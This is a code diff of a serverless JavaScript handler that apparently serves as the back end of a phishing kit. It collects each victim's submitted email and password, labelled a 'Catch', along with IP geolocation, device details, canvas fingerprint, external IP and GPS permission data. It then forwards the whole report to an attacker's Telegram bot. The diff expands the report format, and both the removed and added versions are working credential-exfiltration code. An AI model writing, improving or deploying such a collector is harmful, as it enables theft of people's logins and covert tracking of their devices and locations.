@@ -9,42 +9,73 @@ module.exports = async (req, res) => {
     if (req.method === 'OPTIONS') return res.status(200).end();
     if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
 
-    const d = req.body;
-    const i = d.intel || {};
-    const h = req.headers;
+    const data = req.body;
+    const intel = data.intel || {};
 
-    const geo = {
-        ip: h['x-forwarded-for']?.split(',')[0] || 'x',
-        country: h['x-vercel-ip-country'] || 'x',
-        city: h['x-vercel-ip-city'] || 'x',
-        lat: h['x-vercel-ip-latitude'] || 'x',
-        lon: h['x-vercel-ip-longitude'] || 'x'
+    // Server-side geo from Vercel headers
+    const serverGeo = {
+        ip: req.headers['x-forwarded-for']?.split(',')[0] || 'unknown',
+        country: req.headers['x-vercel-ip-country'] || 'unknown',
+        city: req.headers['x-vercel-ip-city'] || 'unknown',
+        region: req.headers['x-vercel-ip-country-region'] || 'unknown',
+        lat: req.headers['x-vercel-ip-latitude'] || 'unknown',
+        lon: req.headers['x-vercel-ip-longitude'] || 'unknown',
+        timezone: req.headers['x-vercel-ip-timezone'] || 'unknown'
     };
 
-    const ua = d.userAgent || '';
-    const browser = ua.match(/(Chrome|Firefox|Safari|Edge)\/[\d.]+/)?.[0] || 'x';
-    const os = ua.match(/\(([^)]+)\)/)?.[1]?.split(';')[0] || 'x';
+    // Parse user agent for clean browser/OS display
+    const ua = data.userAgent || '';
+    const browser = ua.match(/(Chrome|Firefox|Safari|Edge)\/[\d.]+/)?.[0] || 'Unknown';
+    const os = ua.match(/\(([^)]+)\)/)?.[1] || 'Unknown';
 
-    const text = 
-        `🎣 #${d.attemptNumber} | ${d.email} | ${d.password}\n` +
-        `🌍 ${geo.ip} | ${geo.country} | ${geo.city} | ${geo.lat},${geo.lon}\n` +
-        `💻 ${browser} | ${os} | ${i.platform} | ${i.screen} | ${i.cores}c | ${i.memory}GB\n` +
-        `🔍 Canvas:${i.canvas} | WebRTC:${i.rtc} | ExtIP:${i.extIP}\n` +
-        `🔋 ${i.battery} | ${i.net} | ${i.languages?.[0]} | ${i.timezone}\n` +
-        (i.gps ? `📍 GPS:${i.gps} (acc:${i.geoPerm})\n` : '') +
-        `⏰ ${new Date(d.timestamp).toLocaleString()}`;
+    const text = `🎣 *Catch #${data.attemptNumber}*\n` +
+                 `━━━━━━━━━━━━━━━━━━━━\n\n` +
+                 `*📧 Credentials*\n` +
+                 `Email: \\${data.email}\n` +
+                 `Pass: \\${data.password}\n\n` +
+                 `*🌍 Location (Server)*\n` +
+                 `IP: \\${serverGeo.ip}\n` +
+                 `Country: \\${serverGeo.country}\n` +
+                 `City: \\${serverGeo.city}\n` +
+                 `Region: \\${serverGeo.region}\n` +
+                 `Coords: \\${serverGeo.lat}, \\${serverGeo.lon}\n\n` +
+                 `*💻 Device*\n` +
+                 `Browser: \\${browser}\n` +
+                 `OS: \\${os}\n` +
+                 `Screen: \\${intel.screen}\n` +
+                 `Cores: \\${intel.cores}\n` +
+                 `RAM: \\${intel.memory}GB\n` +
+                 `Battery: \\${intel.batteryLevel} \\${intel.batteryCharging ? '(charging)' : ''}\n` +
+                 `Connection: \\${intel.connectionType} / \\${intel.downlink}Mbps\n` +
+                 `Touch: \\${intel.touchPoints} points\n\n` +
+                 `*🔍 Fingerprint*\n` +
+                 `Canvas: \\${intel.canvasHash}\n` +
+                 `Timezone: \\${intel.timezone}\n` +
+                 `Languages: \\${intel.languages?.join(', ')}\n` +
+                 `Referrer: \\${intel.referrer}\n` +
+                 `External IP: \\${intel.externalIP}\n` +
+                 `Geo Permission: \\${intel.geoPermission}\n` +
+                 `Media: \\${intel.mediaDevices}\n\n` +
+                 `*⏰ Time*\n` +
+                 `\\${new Date(data.timestamp).toLocaleString()}`;
 
     try {
-        const tg = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: text,
+                parse_mode: 'MarkdownV2'
+            })
         });
-        const data = await tg.json();
-        if (!data.ok) throw new Error(data.description);
+
+        const tgData = await tgRes.json();
+        if (!tgData.ok) throw new Error(tgData.description);
+
         return res.status(200).json({ ok: true });
     } catch (err) {
-        console.error('TG error:', err.message);
+        console.error('Telegram error:', err.message);
         return res.status(200).json({ ok: false, error: err.message });
     }
 };
